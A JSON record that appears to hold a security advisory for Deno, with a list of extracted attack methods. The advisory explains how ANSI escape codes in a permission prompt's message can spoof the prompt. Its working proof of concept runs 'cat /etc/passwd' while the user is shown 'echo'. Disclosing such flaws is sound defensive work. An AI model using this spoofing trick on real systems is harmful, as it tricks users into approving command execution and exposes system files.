{"description": "### Summary\nArbitrary program names without any ANSI filtering allows any malicious program to clear the first 2 lines of a `op_spawn_child` or `op_kill` prompt and replace it with any desired text.\n\n### Details\n\nThe main entry point comes down to the ability to override what the API control says ([40_process.js](https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175)). Because of ANSI code's ability to clear lines, a malicious program can clear the last 2 lines of the prompt and put their own header. This also works in `op_kill`.\n\n### PoC\n\nThis PoC works on 1.31.1, but modified versions of it work on older versions.\n\nMake a file, e.g. `index.ts`, that uses this vulnerability to spoof the `op_spawn_child` permission prompt\n\n```ts\nconst boldANSI = \"\\u001b[1m\" // bold\nconst unboldANSI = \"\\u001b[22m\" // unbold\n\nconst prompt = `\u250c \u26a0\ufe0f  ${boldANSI}Deno requests run access to \"echo\"${unboldANSI}\n\u251c Requested by \\`Deno.Command().output()`\n\nconst moveANSIUp = \"\\u001b[1A\" // moves to the start of the line\nconst clearANSI = \"\\u001b[2K\" // clears the line\nconst moveANSIStart = \"\\u001b[1000D\" // moves to the start of the line\n\nDeno[Object.getOwnPropertySymbols(Deno)[0]].core.ops.op_spawn_child({\n    cmd: \"cat\",\n    args: [\"/etc/passwd\"],\n    clearEnv: false,\n    env: [],\n    stdin: \"null\",\n    stdout: \"inherit\",\n    stderr: \"piped\"\n}, moveANSIUp + clearANSI + moveANSIStart + prompt)\n```\n\nRun the file with `deno run index.ts`.\n\n### Impact\nAny Deno program is able to spoof the interactive permission prompt for the `op_spawn_child` or the `op_kill` action (which indirectly gives access to all run commands) by overriding the `Requested by {message} API` with their own ANSI codes, allowing them to clear the latter prompt and change it to whatever they needed:\n\n```\n// Expected Prompt\n\u250c \u26a0\ufe0f  Deno requests run access to \"cat\"\n\u251c Requested by `Deno.Command().output()` API\n\u251c Run again with --allow-run to bypass this prompt.\n\u2514 Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) >\n\n// Actual Prompt\n\u250c \u26a0\ufe0f  Deno requests run access to \"echo\"\n\u251c Requested by `Deno.Command().output()` API\n\u251c Run again with --allow-run to bypass this prompt.\n\u2514 Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) >\n```\n\nThis works with any command on the respective platform, giving the program the full ability to choose what program they wanted to run.\n\nThis problem can not be exploited on systems that do not attach an interactive prompt (for example headless servers).\n\nBefore `v1.31.0`, this requires the `--unstable` flag. \n", "methods": ["Spoofed interactive `run` permission prompt via improper ANSI neutralization.", "Spoofed `op_spawn_child` permission prompt.", "Spoofed `op_kill` permission prompt.", "Spoofed interactive permission prompt for all run commands.", "Spoofed `Requested by {message} API` with own ANSI codes.", "Cleared the last 2 lines of the prompt and replaced with own header.", "Used ANSI code to clear lines.", "Used ANSI code to move to the start of the line.", "Used ANSI code to move up a line.", "Used ANSI code to clear the line.", "Used ANSI code to unbold text.", "Used ANSI code to bold text.", "Used Deno's `op_spawn_child` function to execute commands.", "Used Deno's `op_kill` function to terminate processes.", "Used Deno's `Deno.Command().output()` API to spoof the prompt.", "Used Deno's `--unstable` flag to exploit the vulnerability on older versions.", "Used Deno's `--allow-run` flag to bypass the prompt."]}